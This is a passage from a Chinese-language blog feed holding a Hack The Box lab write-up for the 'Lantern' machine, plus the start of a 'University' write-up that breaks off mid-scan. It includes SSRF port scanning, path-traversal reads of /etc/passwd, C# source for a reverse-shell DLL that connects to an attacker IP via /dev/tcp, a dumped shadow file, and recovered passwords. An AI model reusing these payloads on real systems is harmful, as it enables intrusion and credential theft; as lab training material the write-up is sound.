</span><br><span class="line">|     HTTP/1.1 500 Internal Server Error</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Content-Type: text/plain; charset=utf-8</span><br><span class="line">|     Date: Tue, 12 Nov 2024 00:10:36 GMT</span><br><span class="line">|     Server: Kestrel</span><br><span class="line">|     System.UriFormatException: Invalid URI: The hostname could not be parsed.</span><br><span class="line">|     System.Uri.CreateThis(String uri, Boolean dontEscape, UriKind uriKind, UriCreationOptions&amp; creationOptions)</span><br><span class="line">|     System.Uri..ctor(String uriString, UriKind uriKind)</span><br><span class="line">|     Microsoft.AspNetCore.Components.NavigationManager.set_BaseUri(String value)</span><br><span class="line">|     Microsoft.AspNetCore.Components.NavigationManager.Initialize(String baseUri, String uri)</span><br><span class="line">|     Microsoft.AspNetCore.Components.Server.Circuits.RemoteNavigationManager.Initialize(String baseUri, String uri)</span><br><span class="line">|     Microsoft.AspNetCore.Mvc.ViewFeatures.StaticComponentRenderer.&lt;InitializeStandardComponentServicesAsync&gt;g__InitializeCore|5_0(HttpContext httpContext)</span><br><span class="line">|     Microsoft.AspNetCore.Mvc.ViewFeatures.StaticC</span><br><span class="line">|   HTTPOptions: </span><br><span class="line">|     HTTP/1.1 200 OK</span><br><span class="line">|     Content-Length: 0</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Date: Tue, 12 Nov 2024 00:10:42 GMT</span><br><span class="line">|     Server: Kestrel</span><br><span class="line">|   Help: </span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Content-Length: 0</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Date: Tue, 12 Nov 2024 00:10:36 GMT</span><br><span class="line">|     Server: Kestrel</span><br><span class="line">|   RTSPRequest: </span><br><span class="line">|     HTTP/1.1 505 HTTP Version Not Supported</span><br><span class="line">|     Content-Length: 0</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Date: Tue, 12 Nov 2024 00:10:42 GMT</span><br><span class="line">|     Server: Kestrel</span><br><span class="line">|   SSLSessionReq, TerminalServerCookie: </span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Content-Length: 0</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Date: Tue, 12 Nov 2024 00:10:58 GMT</span><br><span class="line">|_    Server: Kestrel</span><br></pre></td></tr></table></figure><h3 id="VHost-Scan"><a href="#VHost-Scan" class="headerlink" title="VHost Scan"></a>VHost Scan</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -u http://lantern.htb/ -H <span class="string">&quot;Host: FUZZ.lantern.htb&quot;</span> -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -<span class="built_in">fc</span> 302 -o logs/vhost.log</span><br></pre></td></tr></table></figure><img src="/2024/11/11/HTB-Lantern/image-20241112160430044.png" class=""><h2 id="Shell-as-Tomas"><a href="#Shell-as-Tomas" class="headerlink" title="Shell as Tomas"></a>Shell as Tomas</h2><img src="/2024/11/11/HTB-Lantern/image-20241112083908416.png" class=""><p>查看 80 端口，一个普通的主页，在下面发现三个名称，先作为用户名保存起来</p><ul><li>扫描目录</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">feroxbuster --no-state -u http://lantern.htb/ -o logs/feroxbuster_lantern_htb.log</span><br></pre></td></tr></table></figure><img src="/2024/11/11/HTB-Lantern/image-20241112160559333.png" class=""><p>没发现什么有用的目录，回看 Nmap 日志，或者查看数据包</p><img src="/2024/11/11/HTB-Lantern/image-20241112092408097.png" class=""><p>发现使用的 HTTP 服务器是 Skipper Proxy，并且找到一个 SSRF 漏洞</p><img src="/2024/11/11/HTB-Lantern/image-20241112092533564.png" class=""><img src="/2024/11/11/HTB-Lantern/image-20241112093135450.png" class=""><p>构造请求包</p><img src="/2024/11/11/HTB-Lantern/image-20241112093307723.png" class=""><img src="/2024/11/11/HTB-Lantern/image-20241112093317166.png" class=""><p>可以看到是存在漏洞的，那么可以利用此漏洞进行端口扫描</p><img src="/2024/11/11/HTB-Lantern/image-20241112093423418.png" class=""><p>首先对 nmap 发现的 3000 端口进行尝试，发现响应中有一部分类似 Base64 的数据</p><img src="/2024/11/11/HTB-Lantern/image-20241112093844040.png" class=""><p>看到其中有 <code>\u002B</code>，替换成 + 号再次尝试</p><img src="/2024/11/11/HTB-Lantern/image-20241112100318740.png" class=""><p>Base64 解码失败，识别发现很可能是某种加密，暂且搁置，先扫描一下看看是否有其他端口。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -u http://lantern.htb/ -H <span class="string">&quot;X-Skipper-Proxy: http://127.0.0.1:FUZZ&quot;</span> -w res/top1000.port -mc 200</span><br></pre></td></tr></table></figure><img src="/2024/11/11/HTB-Lantern/image-20241112100933430.png" class=""><p>发现 5000、8000 端口</p><img src="/2024/11/11/HTB-Lantern/image-20241112101049847.png" class=""><p>其中 5000 端口的响应，像是一个跳转页面，使用浏览器打开</p><img src="/2024/11/11/HTB-Lantern/image-20241112101214046.png" class=""><p>还是加载错误</p><img src="/2024/11/11/HTB-Lantern/image-20241112101345973.png" class=""><p>再看 8000 端口和 80 端口内容一样，那就侧重一下 5000 端口</p><img src="/2024/11/11/HTB-Lantern/image-20241112101754219.png" class=""><p>结合搜索引擎，发现一个眼熟的服务，但是 3000 端口的字符串是 blazor，由于不太了解，只能再次搜索</p><img src="/2024/11/11/HTB-Lantern/image-20241112101853113.png" class=""><p>看来确实是有关系的，那么可以搜索一下这个 blazor 框架的相关路径</p><img src="/2024/11/11/HTB-Lantern/image-20241112102828099.png" class=""><p>从字典中找到两个路径，尝试访问一下</p><img src="/2024/11/11/HTB-Lantern/image-20241112102902586.png" class=""><p>发现了一些 DLL 及其 sha256，这里可以看一下有没有自定义的 dll 文件</p><img src="/2024/11/11/HTB-Lantern/image-20241112103432369.png" class=""><img src="/2024/11/11/HTB-Lantern/image-20241112103649554.png" class=""><p>下载到本地，查看字符串，由于 Windows 变成会用宽字符，所以也要尝试 <code>strings -e b</code> 查看</p><img src="/2024/11/11/HTB-Lantern/image-20241112103805766.png" class=""><p>有些 base64 字符串，也有噪音，可以使用 CodemerxDecompile 看一下</p><img src="/2024/11/11/HTB-Lantern/image-20241112164228242.png" class=""><img src="/2024/11/11/HTB-Lantern/image-20241112114621122.png" class=""><p>其中包含一个凭据 <code>admin:AJbFA_Q@925p9ap#22</code>，尝试 ssh 登录失败，转向 3000 端口</p><img src="/2024/11/11/HTB-Lantern/image-20241112122728945.png" class=""><img src="/2024/11/11/HTB-Lantern/image-20241112125546716.png" class=""><p>这里可以看到 8000 端口的 Web 服务，其中有个很明显的拼接漏洞，如果传入的参数为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lang = ../../../</span><br><span class="line">file_ext = <span class="string">&#x27;./etc/passwd&#x27;</span></span><br></pre></td></tr></table></figure><p>那么最终拼接得到的字符串为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/var/www/sites/localisation/../../.././etc/passwd</span><br><span class="line">=&gt; /etc/passwd</span><br></pre></td></tr></table></figure><img src="/2024/11/11/HTB-Lantern/image-20241112130043331.png" class=""><p>其中分配到 Bash 的用户有 <code>root</code>、<code>tomas</code> 尝试读取他们目录下的私钥</p><img src="/2024/11/11/HTB-Lantern/image-20241112130912002.png" class=""><p>尝试了几次无法读取，猜测可能是权限不够</p><img src="/2024/11/11/HTB-Lantern/image-20241112150022331.png" class=""><p>再看这里的 Logs 功能，发现他是加载 <code>/opt/composnents/Logs.dll</code> 实现的，那么刚好这里也有一个上传接口，如果能上传一个 vuln.dll 到这里然后利用此功能点加载 dll 应该可以获得进一步的权限。</p><img src="/2024/11/11/HTB-Lantern/image-20241112150155147.png" class=""><p>这里的上传流量是 blazor 框架以 Web Assembly 方式运行，通过 Web socket 通讯，因此 BurpSuite 需要一个 Blazor Traffic Processor 插件会比较方便。</p><p>那么接下来创建一个 C# 项目</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dotnet new classlib -n rev</span><br></pre></td></tr></table></figure><p>编辑 <code>rev/Class1.cs</code></p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">BackConnect</span> &#123;</span><br><span class="line">  <span class="keyword">class</span> <span class="title">ReverseBash</span> &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span> &#123;</span><br><span class="line">          Process proc = <span class="keyword">new</span> System.Diagnostics.Process();</span><br><span class="line">          proc.StartInfo.FileName = <span class="string">&quot;sh&quot;</span>;</span><br><span class="line">          proc.StartInfo.Arguments = <span class="string">&quot;-c \&quot;sh -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1\&quot;&quot;</span>;</span><br><span class="line">          proc.StartInfo.UseShellExecute = <span class="literal">false</span>;</span><br><span class="line">          proc.StartInfo.RedirectStandardOutput = <span class="literal">true</span>;</span><br><span class="line">          proc.Start();</span><br><span class="line"></span><br><span class="line">          <span class="keyword">while</span> (!proc.StandardOutput.EndOfStream) &#123;</span><br><span class="line">                Console.WriteLine(proc.StandardOutput.ReadLine());</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译项目，以 release 模式生成</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dotnet build -c release</span><br></pre></td></tr></table></figure><img src="/2024/11/11/HTB-Lantern/image-20241112154014500.png" class=""><p>然后 BurpSuite 开启拦截，上传 dll 文件</p><img src="/2024/11/11/HTB-Lantern/image-20241112155255289.png" class=""><p>将第一个包的数据中的 name 字段更改为下图</p><img src="/2024/11/11/HTB-Lantern/image-20241112155618249.png" class=""><p>后续的数据包都可以放行了</p><img src="/2024/11/11/HTB-Lantern/image-20241112155229302.png" class=""><p>提示上传成功，尝试加载</p><img src="/2024/11/11/HTB-Lantern/image-20241112155706548.png" class=""><p>这里提示缺失 component 类，前面编译时忽略了一点，就是关于 DLL 的加载问题，不像 PE 文件从 Main 函数作为入口，DLL 会有加载函数，那么明白这一点，可以通过模仿 Logs.dll 文件的格式来创建。</p><p>通过任意文件读取漏洞下载 Logs.dll</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://lantern.htb//PrivacyAndPolicy?lang=../../../../../&amp;ext=./opt/components/Logs.dll&quot;</span> -o Logs.dll</span><br></pre></td></tr></table></figure><img src="/2024/11/11/HTB-Lantern/image-20241112164532252.png" class=""><p>反编译可以看到对应的架构，直接拿过来修改</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Microsoft.AspNetCore.Components;</span><br><span class="line"><span class="keyword">using</span> Microsoft.AspNetCore.Components.Rendering;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">rev</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Component</span> : <span class="title">ComponentBase</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">BuildRenderTree</span>(<span class="params">RenderTreeBuilder __builder</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">Process proc = <span class="keyword">new</span> System.Diagnostics.Process();</span><br><span class="line">proc.StartInfo.FileName = <span class="string">&quot;sh&quot;</span>;</span><br><span class="line">proc.StartInfo.Arguments = <span class="string">&quot;-c \&quot;sh -i &gt;&amp; /dev/tcp/10.10.16.44/2233 0&gt;&amp;1\&quot;&quot;</span>;</span><br><span class="line">proc.StartInfo.UseShellExecute = <span class="literal">false</span>;</span><br><span class="line">proc.StartInfo.RedirectStandardOutput = <span class="literal">true</span>;</span><br><span class="line">proc.Start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (!proc.StandardOutput.EndOfStream) &#123;</span><br><span class="line">Console.WriteLine(proc.StandardOutput.ReadLine());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2024/11/11/HTB-Lantern/image-20241112164843828.png" class=""><p>但是编译有报错，需要添加两个包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dotnet add package Microsoft.AspNetCore.Components --version 6.0.0</span><br><span class="line">dotnet add package Microsoft.AspNetCore.Components.Web --version 6.0.0</span><br></pre></td></tr></table></figure><img src="/2024/11/11/HTB-Lantern/image-20241112170949634.png" class=""><p>编译通过，继续前面的上传手法，提示文件重复就重新创建一个项目</p><img src="/2024/11/11/HTB-Lantern/image-20241112170701751.png" class=""><p>这次没有报错，但是 Shell 没有弹回来，更改反弹 Shell 命令，再次尝试</p><img src="/2024/11/11/HTB-Lantern/image-20241112171607443.png" class=""><p>可以成功读取私钥</p><h3 id="Local-Enum"><a href="#Local-Enum" class="headerlink" title="Local Enum"></a>Local Enum</h3><img src="/2024/11/11/HTB-Lantern/image-20241112171724434.png" class=""><p>发现 sudo 权限，而且 procmon 可以监控进程行为，猜测有定时或自动任务运行。</p><img src="/2024/11/11/HTB-Lantern/image-20241112172130488.png" class=""><p>查看进程列表，发现可疑进程</p><h2 id="Shell-as-Root"><a href="#Shell-as-Root" class="headerlink" title="Shell as Root"></a>Shell as Root</h2><p>运行 procmon</p><img src="/2024/11/11/HTB-Lantern/image-20241112172302097.png" class=""><p>发现一些写入行为，使用 <code>sudo procmon -p [pid]</code> 单独抓取，然后保存信息</p><img src="/2024/11/11/HTB-Lantern/image-20241112173619389.png" class=""><p>信息比较杂，使用 -e 参数指定 write 行为</p><img src="/2024/11/11/HTB-Lantern/image-20241112175731726.png" class=""><p>可以看到 arguments 字段是进程写入相关的信息，可以全部导出来，由于是二进制数据，导出来是hex 格式</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> hex(arguments) <span class="keyword">from</span> ebpf;</span><br></pre></td></tr></table></figure><img src="/2024/11/11/HTB-Lantern/image-20241112180210005.png" class=""><p>只抓到了这一点，看来还不够，可以使用 <code>watch -n 1 &quot;ps aux | grep automation&quot;</code> 来监控进程</p><p>当它重新拉起的时候开始捕捉数据，对于导出的数据，去掉不可打印字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read().strip().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        msg = <span class="built_in">bytes</span>.fromhex(i)</span><br><span class="line">        msg = msg.replace(<span class="string">b&#x27;\x00&#x27;</span>, <span class="string">b&#x27;&#x27;</span>).replace(<span class="string">b&#x27;\x01&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">        msg = msg.replace(<span class="string">b&#x27;\x1b&#x27;</span>, <span class="string">b&#x27;&#x27;</span>).replace(<span class="string">b&#x27;\x06&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">        msg = msg.replace(<span class="string">b&#x27;\x08&#x27;</span>, <span class="string">b&#x27;&#x27;</span>).replace(<span class="string">b&#x27;\x90&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">        msg = msg.replace(<span class="string">b&#x27;\xb9&#x27;</span>, <span class="string">b&#x27;&#x27;</span>).replace(<span class="string">b&#x27;\xa5&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">        msg = msg.replace(<span class="string">b&#x27;\xac&#x27;</span>, <span class="string">b&#x27;&#x27;</span>).replace(<span class="string">b&#x27;\x03&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">        msg = msg.replace(<span class="string">b&#x27;\xe0&#x27;</span>, <span class="string">b&#x27;&#x27;</span>).replace(<span class="string">b&#x27;\xfd&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(msg)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[-]&#x27;</span>)</span><br></pre></td></tr></table></figure><img src="/2024/11/11/HTB-Lantern/image-20241112183156047.png" class=""><p>这里部分行的第一位是有字母的，怀疑和密码有关，把第一位是 <code>[</code> 的行过滤掉</p><img src="/2024/11/11/HTB-Lantern/image-20241112184203008.png" class=""><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 1.py | awk -F <span class="string">&quot;&#x27;&quot;</span> <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | <span class="built_in">cut</span> -c 1,2 | <span class="built_in">tr</span> -d <span class="string">&#x27;[?\n &#x27;</span></span><br></pre></td></tr></table></figure><p>从 <code>bbaacckkuupp..sshh</code> 来看，应该是写入到文件 <code>backup.sh</code>，那么上面的 <code>QQ33EEddddttddww33ppMMBB</code> 大概是密码的双写了，去重之后为 <code>Q3Eddtdw3pMB</code></p><img src="/2024/11/11/HTB-Lantern/image-20241112184258652.png" class=""><h2 id="More"><a href="#More" class="headerlink" title="More"></a>More</h2><p>打这个靶机如果熟悉 Bolazr 的话，可以快速想到 5000 端口，以及其默认路径，我这里不太了解，只能通过 Top 1000 去扫描。不过这是一个通用的方法，毕竟，谁能把所有框架全部记住呢？</p><h3 id="Dump-Hash"><a href="#Dump-Hash" class="headerlink" title="Dump Hash"></a>Dump Hash</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root:$y$j9T<span class="variable">$AIkP6DcupUzzLuD19q8Ea</span>.<span class="variable">$yfGWAj50b</span>/chhcl4fuZL3jkIlp2NrkL63C5TXcDumJ0:19718:0:99999:7:::</span><br><span class="line">daemon:*:19579:0:99999:7:::</span><br><span class="line">bin:*:19579:0:99999:7:::</span><br><span class="line">sys:*:19579:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:19579:0:99999:7:::</span><br><span class="line">games:*:19579:0:99999:7:::</span><br><span class="line">man:*:19579:0:99999:7:::</span><br><span class="line">lp:*:19579:0:99999:7:::</span><br><span class="line">mail:*:19579:0:99999:7:::</span><br><span class="line">news:*:19579:0:99999:7:::</span><br><span class="line">uucp:*:19579:0:99999:7:::</span><br><span class="line">proxy:*:19579:0:99999:7:::</span><br><span class="line">www-data:*:19579:0:99999:7:::</span><br><span class="line">backup:*:19579:0:99999:7:::</span><br><span class="line">list:*:19579:0:99999:7:::</span><br><span class="line">irc:*:19579:0:99999:7:::</span><br><span class="line">gnats:*:19579:0:99999:7:::</span><br><span class="line">nobody:*:19579:0:99999:7:::</span><br><span class="line">_apt:*:19579:0:99999:7:::</span><br><span class="line">systemd-network:*:19579:0:99999:7:::</span><br><span class="line">systemd-resolve:*:19579:0:99999:7:::</span><br><span class="line">messagebus:*:19579:0:99999:7:::</span><br><span class="line">systemd-timesync:*:19579:0:99999:7:::</span><br><span class="line">pollinate:*:19579:0:99999:7:::</span><br><span class="line">sshd:*:19579:0:99999:7:::</span><br><span class="line">syslog:*:19579:0:99999:7:::</span><br><span class="line">uuidd:*:19579:0:99999:7:::</span><br><span class="line">tcpdump:*:19579:0:99999:7:::</span><br><span class="line">tss:*:19579:0:99999:7:::</span><br><span class="line">landscape:*:19579:0:99999:7:::</span><br><span class="line">fwupd-refresh:*:19579:0:99999:7:::</span><br><span class="line">usbmux:*:19715:0:99999:7:::</span><br><span class="line">tomas:$y$j9T$iBupKrKnYvDsG24KvgKi61<span class="variable">$P9qTNx7BdVbyqWp5homuabzMA</span>/vr.h3fds5VYDeMII3:19718:0:99999:7:::</span><br><span class="line">lxd:!:19715::::::</span><br><span class="line">_laurel:!:19936::::::</span><br></pre></td></tr></table></figure><h3 id="bot-exp"><a href="#bot-exp" class="headerlink" title="bot.exp"></a>bot.exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/expect -f</span></span><br><span class="line"></span><br><span class="line">spawn nano /root/automation.sh</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> text <span class="string">&quot;echo Q3Eddtdw3pMB | sudo ./backup.sh&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> &#123;1&#125; &#123;</span><br><span class="line">    foreach char [<span class="built_in">split</span> <span class="variable">$text</span> <span class="string">&quot;&quot;</span>] &#123;</span><br><span class="line">        send <span class="string">&quot;<span class="variable">$char</span>&quot;</span></span><br><span class="line">        <span class="built_in">sleep</span> 1</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    send <span class="string">&quot;\r&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">sleep</span> 0.5</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> &#123;<span class="built_in">set</span> i 0&#125; &#123;<span class="variable">$i</span> &lt; [string length <span class="variable">$text</span>]&#125; &#123;incr i&#125; &#123;</span><br><span class="line">        send <span class="string">&quot;\b \b&quot;</span>  ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    send <span class="string">&quot;\r&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;img src=&quot;/2024/11/11/HTB-Lantern/Lantern.png&quot; class=&quot;&quot;&gt;

&lt;h2 id=&quot;Enum-Recon&quot;&gt;&lt;a href=&quot;#Enum-Recon&quot; class=&quot;headerlink&quot; title=&quot;Enum &amp;amp; Rec</summary>
      
    
    
    
    <category term="Machines" scheme="http://fermionorz.github.io/categories/Machines/"/>
    
    <category term="Linux" scheme="http://fermionorz.github.io/categories/Machines/Linux/"/>
    
    <category term="Hard" scheme="http://fermionorz.github.io/categories/Machines/Linux/Hard/"/>
    
    
    <category term="Skipper_Proxy" scheme="http://fermionorz.github.io/tags/Skipper-Proxy/"/>
    
    <category term="SSRF" scheme="http://fermionorz.github.io/tags/SSRF/"/>
    
    <category term="LFI" scheme="http://fermionorz.github.io/tags/LFI/"/>
    
    <category term="Procmon" scheme="http://fermionorz.github.io/tags/Procmon/"/>
    
    <category term="CVE-2022-38580" scheme="http://fermionorz.github.io/tags/CVE-2022-38580/"/>
    
    <category term="CodemerxDecompile" scheme="http://fermionorz.github.io/tags/CodemerxDecompile/"/>
    
    <category term="Blazor" scheme="http://fermionorz.github.io/tags/Blazor/"/>
    
    <category term="Dotnet" scheme="http://fermionorz.github.io/tags/Dotnet/"/>
    
  </entry>
  
  <entry>
    <title>[M] University [Undone]</title>
    <link href="http://fermionorz.github.io/2024/11/07/HTB-University/"/>
    <id>http://fermionorz.github.io/2024/11/07/HTB-University/</id>
    <published>2024-11-07T16:00:00.000Z</published>
    <updated>2024-11-18T12:30:51.263Z</updated>
    
    <content type="html"><![CDATA[<img src="/2024/11/07/HTB-University/University.png" class=""><h2 id="Enum"><a href="#Enum" class="headerlink" title="Enum"></a>Enum</h2><h3 id="Nmap-scan"><a href="#Nmap-scan" class="headerlink" title="Nmap scan"></a>Nmap scan</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">80/tcp    open  http          nginx 1.24.0</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD OPTIONS</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 4B8EA3A7F1A92D888835020074BB5558</span><br><span class="line">|_http-server-header: nginx/1.24.0</span><br><span class="line">|_http-title: University</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-08 14:31:30Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: university.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">2179/tcp  open  vmrdp?</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: university.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">49666/tcp open  msrpc         Microsoft Windows RPC</span><br><span 